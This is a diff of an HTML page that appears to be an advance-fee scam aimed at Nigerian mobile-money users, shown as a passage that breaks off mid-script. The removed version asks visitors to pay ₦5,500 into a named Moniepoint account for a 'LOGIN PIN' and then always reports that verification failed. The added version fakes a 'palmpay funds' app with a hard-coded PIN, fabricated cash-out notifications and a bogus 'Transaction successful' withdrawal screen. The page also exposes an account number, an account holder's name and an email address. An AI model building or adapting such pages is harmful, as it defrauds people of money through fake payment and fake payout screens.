@@ -1,453 +1,558 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Buy LOGIN PIN</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f3f4f6; /* A light gray background to match the screenshot's empty space */
-        }
-        .pay-button:hover {
-            background-color: #5b21b6; /* A slightly darker purple for hover effect */
-        }
-        /* Custom CSS for the loading spinner */
-        .spinner {
-            border: 6px solid rgba(0, 0, 0, 0.1); /* Increased border for a bolder look */
-            width: 80px; /* Made the spinner bigger */
-            height: 80px; /* Made the spinner bigger */
-            border-radius: 50%;
-            border-left-color: #7c3aed; /* Purple color for the spinner */
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .message-box {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white;
-            padding: 2rem;
-            border-radius: 1rem;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            z-index: 50;
-            width: 80%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 40;
-        }
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>pamlpay funds</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #fff;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 15px;
+      font-size: 18px;
+      color: #000;
+      margin-bottom: 20px;
+    }
+    .status {
+      display: flex;
+      align-items: center;
+    }
+    .network, .battery {
+      margin-left: 10px;
+    }
+    .login-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .profile {
+      margin-bottom: 20px;
+    }
+    /* logo image */
+    .profile-icon img {
+      width: 120px;
+      height: auto;
+      border-radius: 50%; /* optional */
+      display: block; /* Added to ensure it behaves as a block element for centering */
+      margin-left: auto; /* Added for centering */
+      margin-right: auto; /* Added for centering */
+    }
+    .username {
+      font-size: 30px;
+      color: #333;
+    }
+    .login-text {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .pin-dots {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .dot {
+      width: 10px;
+      height: 10px;
+      background-color: #ccc;
+      border-radius: 50%;
+      margin: 0 5px;
+    }
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+    .key {
+      width: 100%;
+      padding-top: 20px;
+      padding-bottom: 20px;
+      background-color: #eee;
+      border: none;
+      border-radius: 10px;
+      font-size: 24px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border: 1px solid #7a57d1;
+    }
+    .key.backspace {
+      font-size: 18px;
+    }
+    .switch-account {
+      font-size: 14px;
+      color: #333;
+    }
+    .switch-account a {
+      color: #7a57d1;
+      text-decoration: none;
+    }
+    .switch-account a:hover {
+      text-decoration: underline;
+    }
+    .notification {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color:#7a57d1;
+      color: white;
+      padding: 15px;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
+    }
+    .notification.show {
+      display: block;
+      animation: slideDown 0.5s forwards, slideUp 0.5s forwards 3s;
+    }
+    @keyframes slideDown {
+      0% { top: -50px; }
+      100% { top: 0; }
+    }
+    @keyframes slideUp {
+      0% { top: 0; }
+      100% { top: -50px; }
+    }
+    /* Popup (incorrect PIN) styles */
+    .popup-overlay {
+      display: none; /* hidden by default */
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .popup-overlay.show {
+      display: flex;
+    }
+    .popup {
+      background: #fff;
+      border-radius: 10px;
+      padding: 18px;
+      max-width: 360px;
+      width: 100%;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      text-align: center;
+    }
+    .popup h3 {
+      margin: 0 0 8px;
+      font-size: 18px;
+      color: #222;
+    }
+    .popup p {
+      margin: 0 0 16px;
+      color: #444;
+    }
+    .popup .btns {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+    .btn {
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .btn-primary {
+      background: #7a57d1;
+      color: #fff;
+    }
+    .btn-secondary {
+      background: #eee;
+      color: #333;
+    }
+    .popup .close-x {
+      position: absolute;
+      top: 12px;
+      right: 16px;
+      background: transparent;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+    }
 
-        /* --- Custom CSS for the Bank Transfer Page --- */
-        :root{
-            --hdr:#f0f1f4;      /* grey header bg */
-            --danger:#ff3b30;   /* Cancel */
-            --card:#f6f7fb;     /* light card */
-            --btn:#ff9f0a;      /* orange buttons */
-            --text:#0b0b0b;
-            --muted:#8a8a8a;
-        }
-        *{box-sizing:border-box}
-        .bank-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,system-ui,sans-serif;color:var(--text);background:#fff}
+    /* Dashboard and Withdraw Page Styles */
+    #dashboard, #withdrawPage {
+      transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+    }
+    #dashboard.hidden, #withdrawPage.hidden {
+      opacity: 0;
+      transform: scale(0.95);
+      pointer-events: none;
+    }
+    .icon-container { width: 70px; height: 70px; }
+    .icon-svg { width: 40px; height: 40px; }
+    .carousel { display: flex; overflow: hidden; position: relative; width: 100%; height: 200px; border-radius: 12px; }
+    .carousel img { flex: 0 0 100%; transition: transform 0.7s ease-in-out; object-fit: cover; width: 100%; height: 100%; }
+    .popup-msg { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #5B21B6; color: white; padding: 12px 20px; border-radius: 12px; font-size: 14px; display: none; z-index: 50; }
 
-        .header-bank{
-            background:var(--hdr);
-            border-bottom:1px solid #e6e7eb;
-            padding:12px 16px;
-            display:flex;align-items:center;justify-content:space-between;
-        }
-        .header-bank .title{font-size:22px;font-weight:650;letter-spacing:.2px}
-        .header-bank .cancel{color:var(--danger);font-weight:600}
-
-        /* ROW: icon far-left, amount+email far-right */
-        .summary{
-            padding:18px 16px 8px;
-            display:flex;align-items:center;justify-content:space-between;
-            gap:12px;
-        }
-        .logo{
-            width:56px;height:56px;border-radius:50%;
-            background:#172a68;display:grid;place-items:center;flex:0 0 56px;
-        }
-        .ring{width:30px;height:30px;border-radius:50%;
-                box-shadow:0 0 0 4px #f59f0a inset, 0 0 0 10px #172a68 inset;}
-        .right-block{flex:1;display:flex;flex-direction:column;align-items:flex-end;text-align:right;min-width:0}
-        .amount{font-size:22px;font-weight:800;line-height:1.1}
-        .amount small{font-weight:700;opacity:.9;margin-right:4px}
-        .email{margin-top:2px;font-size:14px;color:var(--muted);word-break:break-all}
-
-        .instruction{text-align:center;font-size:15px;color:#444;padding:4px 16px 14px}
-
-        .card{
-            background:var(--card);
-            border:1px solid #eceef4;
-            border-radius:18px;
-            margin:0 16px 18px;
-            padding:14px;
-        }
-        .field{margin:10px 0 14px}
-        .label{display:flex;align-items:center;gap:8px;font-size:13px;color:#7a8699;margin-bottom:6px}
-        .chip{
-            width:22px;height:22px;border-radius:6px;background:#dde6ff;
-            color:#2746d6;font-weight:700;font-size:12px;display:grid;place-items:center;
-        }
-        .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
-        .value{font-size:18px;font-weight:800;letter-spacing:.2px}
-        .copy{
-            border:0;background:var(--btn);color:#fff;
-            padding:8px 14px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer
-        }
-        .note{color:#444;font-size:14px;line-height:1.45;margin-top:2px}
-
-        .cta{
-            margin-top:14px;width:100%;border:0;background:var(--btn);
-            color:#1c1400;padding:14px 16px;border-radius:10px;font-weight:800;font-size:16px;cursor:pointer
-        }
-
-        /* copy toast */
-        .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);
-                background:#111827;color:#fff;padding:10px 14px;border-radius:10px;
-                font-size:14px;opacity:0;pointer-events:none;transition:opacity .25s}
-        .toast.show{opacity:1}
-
-        /* Final Loading Countdown */
-        .countdown-container {
-            position: relative;
-            width: 140px;
-            height: 140px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .countdown-svg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            transform: rotate(-90deg);
-        }
-        .countdown-svg circle {
-            fill: none;
-            stroke-width: 8px;
-        }
-        .countdown-svg .bg {
-            stroke: #e2e8f0;
-        }
-        .countdown-svg .progress {
-            stroke: #3b82f6; /* Blue color for the progress bar */
-            stroke-dasharray: 377; /* 2 * pi * radius (60) */
-            stroke-dashoffset: 377;
-            transition: stroke-dashoffset 1s linear;
-        }
-        .countdown-number {
-            font-size: 3rem;
-            font-weight: 600;
-        }
-        
-        /* --- Styles for the new error page --- */
-        .error-page-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 24px;
-        }
-        .error-icon-bg {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background-color: #ef4444; /* red-500 */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 24px;
-        }
-        .error-icon-svg {
-            color: white;
-            width: 60px;
-            height: 60px;
-        }
-        .error-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #fb923c; /* orange-400 */
-            margin-bottom: 12px;
-        }
-        .error-message {
-            font-size: 16px;
-            color: #4b5563; /* gray-600 */
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-        .input-group {
-            position: relative;
-            width: 100%;
-            max-width: 300px;
-            margin-bottom: 24px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 40px 12px 16px;
-            border-radius: 12px;
-            border: 1px solid #d1d5db; /* gray-300 */
-            background-color: white;
-            font-size: 16px;
-        }
-        .input-group .toggle-btn {
-            position: absolute;
-            right: 8px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 8px;
-        }
-        .input-group .toggle-btn svg {
-            color: #6b7280; /* gray-500 */
-            width: 20px;
-            height: 20px;
-        }
-        .try-again-btn {
-            width: 100%;
-            max-width: 300px;
-            background-color: #7c3aed; /* purple-600 */
-            color: white;
-            font-size: 18px;
-            font-weight: 600;
-            padding: 14px 16px;
-            border-radius: 12px;
-            border: none;
-        }
-    </style>
+    /* Withdraw overlay styles */
+    :root{ --bg:#fff8fb; --purple:#8e24aa; }
+    .overlay { position:fixed; inset:0; width:100%; height:100%; display:none; align-items:center; justify-content:center; z-index:60; background:var(--bg); }
+    .spinner{ width:72px; height:72px; display:block; margin-bottom:18px; }
+    .arc{ transform-origin:50% 50%; animation:spin 1.2s linear infinite; }
+    .arc circle{ fill:none; stroke:var(--purple); stroke-width:6; stroke-linecap:round; stroke-dasharray:55 200; }
+    @keyframes spin{ from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+    .loading-text{ font-size:20px; font-weight:600; color:var(--purple); }
+    .success-wrapper{ width:100%; height:100%; display:flex; flex-direction:column; }
+    .top-bar{ height:36px; background:var(--purple); width:100%; flex:0 0 36px; }
+    .success-content{ flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px; }
+    .checkmark svg{ width:72px; height:72px; stroke:black; stroke-width:6; stroke-linecap:round; stroke-linejoin:round; fill:none; margin-bottom:18px; }
+    .checkmark polyline{ stroke-dasharray:100; stroke-dashoffset:100; animation:dash 0.45s ease forwards 0.08s; }
+    @keyframes dash{ to{ stroke-dashoffset:0; } }
+    .success-text{ font-size:20px; font-weight:700; color:var(--purple); margin-bottom:8px; }
+    .description{ font-size:14px; color:rgba(142,36,170,0.85); }
+    .hidden { display: none !important; }
+  </style>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body class="bg-white min-h-screen">
-    <div id="form-container" class="max-w-md mx-auto min-h-screen flex flex-col bg-white">
-        <header class="bg-purple-800 text-white p-4">
-            <h1 class="text-xl font-semibold">Buy LOGIN PIN</h1>
-        </header>
+<body>
 
-        <main class="flex-grow p-6 space-y-6">
-            <div>
-                <label for="amount" class="block text-gray-700 font-medium mb-2">Amount</label>
-                <div class="relative">
-                    <div class="w-full pl-3 pr-10 py-3 bg-gray-100 rounded-xl text-gray-700 font-medium">
-                        ₦5,500
-                    </div>
-                </div>
-            </div>
-
-            <div>
-                <label for="fullName" class="block text-gray-700 font-medium mb-2">Full Name</label>
-                <input type="text" id="fullName" placeholder="Your full name" class="w-full px-4 py-3 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 placeholder-gray-400">
-            </div>
-
-            <div>
-                <label for="email" class="block text-gray-700 font-medium mb-2">Your Email Address</label>
-                <input type="email" id="email" placeholder="email address" class="w-full px-4 py-3 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 placeholder-gray-400">
-            </div>
-
-            <button id="pay-button" class="pay-button w-full bg-purple-800 text-white font-semibold py-3 rounded-xl shadow-lg">
-                Pay
-            </button>
-        </main>
-
-        <footer class="p-6 text-center text-gray-500 text-sm">
-            <p>Your LOGIN PIN will be displayed on the app once your payment is confirmed.</p>
-        </footer>
+  <!-- LOGIN SCREEN -->
+  <div id="loginScreen" class="container">
+    <div class="header">
+      <div class="time"></div>
+      <div class="status">
+        <div class="network"></div>
+        <div class="battery"></div>
+      </div>
     </div>
-    
-    <div id="loading-container" class="hidden fixed top-0 left-0 w-full h-full bg-white flex flex-col items-center justify-center text-center px-4">
-        <div class="spinner mb-8"></div>
-        <h2 class="text-2xl font-bold mb-2">Processing your request...</h2>
-        <p class="text-gray-500 text-lg">Please wait while we prepare your payment options</p>
+    <div class="login-box">
+      <div class="profile">
+        <div class="profile-icon">
+          <!-- logo image -->
+          <img src="https://raw.githubusercontent.com/darkweb765/Opaypay/main/IMG-20250923-WA0082.jpg" alt="Palmpay funds logo">
+        </div>
+        <div class="username">palmpay funds</div>
+        <div id="notification" class="notification">Olivia cashed out ₦100,000.00</div>
+      </div>
+      <div class="login-text">Login with PIN</div>
+      <div class="pin-dots">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+      </div>
+      <div class="keypad">
+        <button class="key" onclick="enterKey('1')">1</button>
+        <button class="key" onclick="enterKey('2')">2</button>
+        <button class="key" onclick="enterKey('3')">3</button>
+        <button class="key" onclick="enterKey('4')">4</button>
+        <button class="key" onclick="enterKey('5')">5</button>
+        <button class="key" onclick="enterKey('6')">6</button>
+        <button class="key" onclick="enterKey('7')">7</button>
+        <button class="key" onclick="enterKey('8')">8</button>
+        <button class="key" onclick="enterKey('9')">9</button>
+        <button class="key" onclick="enterKey('0')">0</button>
+        <button class="key backspace" onclick="backspace()">←</button>
+        <button class="key backspace" onclick="checkPin()">Enter</button>
+      </div>
+      <div class="switch-account">Don't have a PIN? <a href="purchase.html">Buy</a></div>
+      <br>
+      <div class="switch-account">Email us <a href="mailto:grampay2024@gmail.com">Send email</a></div>
     </div>
+  </div>
 
-    <div id="important-notice-container" class="hidden fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
-        <div class="bg-gray-200 rounded-3xl p-6 text-center max-w-md w-full shadow-lg space-y-4">
-            <h3 class="text-red-500 text-xl font-bold">Important Notice</h3>
-            <p class="text-gray-800 font-medium">Please do NOT make your payment with Opay.</p>
-            <p class="text-gray-600 text-sm">
-                Opay service is currently down. If you make your payment using Opay, your payment may not be confirmed.
-            </p>
-            <p class="text-gray-600 text-sm">
-                If you must use Opay, transfer the money to another bank and use that bank account to make your payment or use POS.
-            </p>
-            <button id="i-understand-btn" class="w-full bg-purple-800 text-white font-semibold py-3 rounded-2xl">
-                I Understand
-            </button>
-        </div>
+  <!-- Popup overlay shown on incorrect PIN -->
+  <div id="popupOverlay" class="popup-overlay" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="popup" role="document">
+      <button class="close-x" aria-label="Close popup" onclick="closePopup()">✕</button>
+      <h3>Hi -- Incorrect PIN code</h3>
+      <p>Click the button below to buy your PIN.</p>
+      <div class="btns">
+        <button class="btn btn-primary" id="buyBtn">Buy PIN</button>
+        <button class="btn btn-secondary" onclick="closePopup()">Close</button>
+      </div>
     </div>
+  </div>
 
+  <!-- DASHBOARD AND WITHDRAW PAGE CONTAINER -->
+  <div id="appContainer" class="hidden w-full max-w-sm">
+    <!-- DASHBOARD (default screen) -->
+    <div id="dashboard" class="bg-white shadow-xl rounded-lg overflow-hidden">
+      <div class="bg-purple-800 rounded-b-[40px] p-6 shadow-md">
+        <div class="flex justify-between items-center text-white mb-6">
+          <span class="text-lg font-semibold">Total balance</span>
+          <a href="#" id="transactionHistory" class="text-sm underline font-medium opacity-80">Transaction History</a>
+        </div>
+        <div class="flex justify-around items-center space-x-4">
+          <!-- Add Money -->
+          <div class="flex flex-col items-center space-y-2 cursor-pointer" id="addMoneyBtn">
+            <div class="bg-white p-4 rounded-xl shadow-md icon-container flex items-center justify-center">
+              <svg class="text-purple-600 icon-svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                      d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
+              </svg>
+            </div>
+            <span class="text-xs text-white">Add Money</span>
+          </div>
 
-    <div id="bank-transfer-container" class="hidden max-w-md mx-auto min-h-screen flex flex-col bg-white bank-body">
-        <div class="header-bank">
-            <div class="title">Bank Transfer</div>
-            <div class="cancel">Cancel</div>
-        </div>
-        <div class="summary">
-            <div class="logo"><div class="ring"></div></div>
-            <div class="right-block">
-                <div class="amount"><small>NGN</small>5,500</div>
-                <div class="email" id="user-email-display"></div>
-            </div>
-        </div>
-        <p class="instruction">Complete this bank transfer to proceed</p>
-        <div class="card">
-            <div class="field">
-                <div class="label"><span class="chip">🧾</span> <span>Amount</span></div>
-                <div class="row">
-                    <div class="value" id="amt">NGN 5,500</div>
-                    <button class="copy" data-copy="#amt">Copy</button>
-                </div>
-            </div>
-            <div class="field">
-                <div class="label"><span class="chip">🔢</span> <span>Account Number</span></div>
-                <div class="row">
-                    <div class="value" id="acct">5082150846</div>
-                    <button class="copy" data-copy="#acct">Copy</button>
-                </div>
-            </div>
-            <div class="field">
-                <div class="label"><span class="chip">🏦</span> <span>Bank Name</span></div>
-                <div class="value">monie point</div>
-            </div>
-            <div class="field">
-                <div class="label"><span class="chip">👤</span> <span>Account Name</span></div>
-                <div class="value">VICTOR NNMDI</div>
-            </div>
-            <div class="note">
-                Transfer the exact amount to the account above. Your LOGIN PIN will be generated automatically after payment confirmation. Use your registered name as the transfer description for faster processing.
-            </div>
-            <button class="cta" id="bank-transfer-cta">I have made this bank Transfer</button>
-        </div>
-        <div class="toast" id="toast">Copied</div>
-    </div>
+          <div class="flex flex-col items-center"><span class="text-5xl"></span></div>
 
-    <div id="final-loading-container" class="hidden fixed top-0 left-0 w-full h-full bg-white flex flex-col items-center justify-center text-center px-4">
-        <div class="countdown-container mb-8">
-            <svg class="countdown-svg">
-                <circle r="60" cx="70" cy="70" class="bg"></circle>
-                <circle r="60" cx="70" cy="70" class="progress"></circle>
-            </svg>
-            <span id="countdown-number" class="countdown-number">10</span>
+          <div class="flex flex-col items-center space-y-2">
+            <div class="bg-white p-4 rounded-xl shadow-md icon-container flex items-center justify-center">
+              <svg class="text-purple-600 icon-svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                      d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/>
+              </svg>
+            </div>
+            <span class="text-xs text-white text-center">check<br>database</span>
+          </div>
         </div>
-        <h2 class="text-2xl font-bold mb-2">Verifying your payment</h2>
-        <p class="text-gray-500 text-lg">Please wait while we confirm your bank transfer...</p>
-    </div>
+      </div>
 
-    <div id="error-page-container" class="hidden max-w-md mx-auto min-h-screen flex flex-col justify-center bg-gray-100">
-        <div class="error-page-container">
-            <div class="error-icon-bg">
-                <svg xmlns="http://www.w3.org/2000/svg" class="error-icon-svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                </svg>
-            </div>
-            <div class="error-title">Transaction verification failed!</div>
-            <p class="error-message">
-                Your payment could not be completed.<br>
-                Reason:No Payment received from you/<br>invalid payment method.
-            </p>
-            <div class="input-group">
-                <input type="password" id="not-available-input" value="Not Available" readonly>
-                <button id="toggle-visibility-btn" class="toggle-btn">
-                    <svg id="eye-closed-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.418 0-8-2.686-8-6s3.582-6 8-6c1.01 0 1.99.191 2.923.541M15 12a3 3 0 11-6 0 3 3 0 016 0zM19 12c-1.378-2.756-3.83-5-6-5-1.92 0-3.693.815-5 2.128M3 3l18 18" />
-                    </svg>
-                    <svg id="eye-open-icon" class="h-5 w-5 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-                    </svg>
-                </button>
-            </div>
-            <button id="try-again-btn" class="try-again-btn">Try Again</button>
+      <div class="p-6">
+        <div class="flex justify-between items-center mb-4">
+          <h2 class="text-lg font-bold text-gray-800">Services</h2>
+          <a href="#" class="text-sm text-purple-600 font-medium">More ></a>
         </div>
+        <div class="flex justify-center mt-6">
+          <div class="w-2 h-2 bg-purple-600 rounded-full mx-1"></div>
+          <div class="w-2 h-2 bg-gray-300 rounded-full mx-1"></div>
+          <div class="w-2 h-2 bg-gray-300 rounded-full mx-1"></div>
+        </div>
+      </div>
+
+      <div class="p-4 pt-0">
+        <div id="carousel" class="carousel cursor-pointer">
+          <img src="https://raw.githubusercontent.com/darkweb765/Opay-bank/main/IMG-20250922-WA0002.jpg">
+          <img src="https://raw.githubusercontent.com/darkweb765/Opay-bank/main/IMG-20250922-WA0004.jpg">
+          <img src="https://raw.githubusercontent.com/darkweb765/Opay-bank/main/IMG-20250922-WA0005.jpg">
+        </div>
+      </div>
     </div>
 
-    <div id="message-box-container" class="hidden">
-        <div class="overlay"></div>
-        <div class="message-box">
-            <p id="message-box-text" class="mb-4"></p>
-            <button id="message-box-close" class="bg-purple-800 text-white px-4 py-2 rounded-lg">Close</button>
+    <!-- WITHDRAW PAGE (hidden by default) -->
+    <div id="withdrawPage" class="hidden w-full min-h-screen bg-[#2a0e5c] flex flex-col items-center">
+      <header class="w-full bg-[#1e0a47] text-white p-4 flex justify-between items-center">
+        <h1 class="text-xl font-bold">Palmpay funds</h1>
+        <button id="backBtn" class="text-sm underline">Back</button>
+      </header>
+
+      <main class="w-full max-w-sm mx-auto mt-8 px-4">
+        <div id="formCard" class="bg-[#1e0a47] rounded-2xl shadow-lg p-6">
+          <div class="space-y-4">
+            <input id="accountNumber" type="text" placeholder="Palmpay Account number" class="w-full p-3 rounded-xl border border-[#3e1b71] bg-white text-gray-900"/>
+            <input id="accountName" type="text" placeholder="Palmpay Account name" class="w-full p-3 rounded-xl border border-[#3e1b71] bg-white text-gray-900"/>
+            <input id="bank" type="text" value="Palmpay Bank" disabled class="w-full p-3 rounded-xl border border-[#3e1b71] bg-white text-gray-900"/>
+            <select id="amountSelect" class="w-full p-3 rounded-xl border border-[#3e1b71] bg-white text-gray-900">
+              <option value="" selected disabled>Select Amount</option>
+              <option value="25000">₦25,000</option>
+              <option value="50000">₦50,000</option>
+              <option value="100000">₦100,000</option>
+              <option value="200000">₦200,000</option>
+            </select>
+            <input id="tag" type="text" placeholder="Personal tag optional" class="w-full p-3 rounded-xl border border-[#3e1b71] bg-white text-gray-900"/>
+          </div>
+          <button id="withdrawBtn" class="mt-8 w-full bg-[#3e1b71] text-white py-3 rounded-xl font-medium">Withdraw</button>
         </div>
+      </main>
+
+      <!-- overlays -->
+      <div id="loadingOverlay" class="overlay"><div><svg class="spinner" viewBox="0 0 72 72"><g class="arc"><circle cx="36" cy="36" r="28"></circle></g></svg><div class="loading-text">Adding funds..</div></div></div>
+      <div id="successOverlay" class="overlay"><div class="success-wrapper"><div class="top-bar"></div><div class="success-content"><div class="checkmark"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div><div class="success-text">Transaction successful</div><div class="description">check your balance after a minute</div></div></div></div>
     </div>
-        <script>
-        const payButton = document.getElementById('pay-button');
-        const bankTransferCTA = document.getElementById('bank-transfer-cta');
-        const iUnderstandBtn = document.getElementById('i-understand-btn');
-        const formContainer = document.getElementById('form-container');
-        const loadingContainer = document.getElementById('loading-container');
-        const bankTransferContainer = document.getElementById('bank-transfer-container');
-        const importantNoticeContainer = document.getElementById('important-notice-container');
-        const finalLoadingContainer = document.getElementById('final-loading-container');
-        const countdownNumber = document.getElementById('countdown-number');
-        const countdownCircle = document.querySelector('.progress');
-        const errorPageContainer = document.getElementById('error-page-container');
-        const tryAgainBtn = document.getElementById('try-again-btn');
-        const fullNameInput = document.getElementById('fullName');
-        const emailInput = document.getElementById('email');
-        const messageBoxContainer = document.getElementById('message-box-container');
-        const messageBoxText = document.getElementById('message-box-text');
-        const messageBoxClose = document.getElementById('message-box-close');
-        
-        // New elements for the error page
-        const notAvailableInput = document.getElementById('not-available-input');
-        const toggleVisibilityBtn = document.getElementById('toggle-visibility-btn');
-        const eyeClosedIcon = document.getElementById('eye-closed-icon');
-        const eyeOpenIcon = document.getElementById('eye-open-icon');
+  </div>
 
-        // New element to display the user's email on the bank transfer page
-        const userEmailDisplay = document.getElementById('user-email-display');
+  <!-- Popup for general messages -->
+  <div id="popup" class="popup-msg"></div>
 
-        // Function to show the custom message box
-        function showMessageBox(message) {
-            messageBoxText.textContent = message;
-            messageBoxContainer.classList.remove('hidden');
-        }
+  <script>
+    // --- PIN Login Logic ---
+    const correctPin = "662094"; // Set your 6-digit PIN here
+    let enteredPin = "";
+    const loginScreen = document.getElementById('loginScreen');
+    const appContainer = document.getElementById('appContainer');
 
-        // Function to hide the custom message box
-        messageBoxClose.addEventListener('click', () => {
-            messageBoxContainer.classList.add('hidden');
-        });
+    function enterKey(key) {
+      if (enteredPin.length < 6) {
+        enteredPin += key;
+        updateDots();
+      }
+    }
+    function backspace() {
+      enteredPin = enteredPin.slice(0, -1);
+      updateDots();
+    }
+    function updateDots() {
+      const dots = document.querySelectorAll(".dot");
+      dots.forEach((dot, index) => {
+        dot.style.backgroundColor = index < enteredPin.length ? "#333" : "#ccc";
+      });
+    }
+    function showPopup() {
+      const overlay = document.getElementById('popupOverlay');
+      overlay.classList.add('show');
+      overlay.setAttribute('aria-hidden', 'false');
+    }
+    function closePopup() {
+      const overlay = document.getElementById('popupOverlay');
+      overlay.classList.remove('show');
+      overlay.setAttribute('aria-hidden', 'true');
+    }
+    function checkPin() {
+      if (enteredPin === correctPin) {
+        // Successfully logged in, hide login screen and show the app content
+        loginScreen.classList.add('hidden');
+        appContainer.classList.remove('hidden');
+        // Optionally clear PIN for next time or keep it depending on UX
+        // enteredPin = "";
+        // updateDots();
+      } else {
+        // Show the popup (instead of alert)
+        showPopup();
+        // Reset the entered PIN and update dots immediately
+        enteredPin = "";
+        updateDots();
+      }
+    }
 
-        // Event listener for the initial "Pay" button click
-        payButton.addEventListener('click', (event) => {
-            event.preventDefault(); // Prevent the form from submitting
+    // --- Notification Logic ---
+    const messages = Array.from({ length: 100 }, () => `${getRandomName()} cashed out ₦${getRandomAmount()}`);
+    function getRandomName() {
+      const names = [
+        "John", "Emma", "Liam", "Sophia", "Noah", "Ava", "William", "Charlotte",
+        "James", "Amelia", "Benjamin", "Mason", "Isabella", "Lucas", "Mia",
+        "Henry", "Harper", "Alexander", "Evelyn", "Olivia", "Daniel", "Ella",
